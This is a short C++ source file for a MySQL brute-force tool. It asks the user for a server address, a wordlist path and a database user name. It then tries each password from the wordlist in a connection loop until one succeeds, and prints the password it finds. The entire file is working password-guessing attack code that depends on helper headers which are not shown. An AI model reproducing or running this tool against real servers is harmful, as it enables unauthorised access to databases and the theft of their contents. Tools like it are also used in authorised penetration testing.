#include <stdio.h>
#include <stdlib.h>
#include "SQL.h"
#include <iostream>
#include <vector>
#include <string>
#include "utils/WordlistToVector.h"

using namespace std;

int main(){
    bool result;

    cout << "\n\tMySQL Brute Force\n" << endl;

    string file = "";
    string user = "";
    string server = "";
    int intentos = 1;

    cout << "Server: ";
    cin >> server;

    cout << "Path of Wordlist: ";
    cin >> file;

    cout << "Database user: ";
    cin >> user;
    
    cout << endl << endl;

    vector<string> passwords = readPasswordsFromFile(file);

    SQL sql = SQL(server, user, "a", "mysql");

    for(int i = 0; i < passwords.size(); i++){
        sql.setPassword(passwords[i]);
        result = sql.connect();

        cout << "Password: " << i << "/"<< passwords[i].c_str() << "\r" << flush;
        intentos++;
        
        if(!result){}
        else{
            cout<< "Password Found: " << passwords[i] << endl;
            break;
        }
    }   

    return 0;

}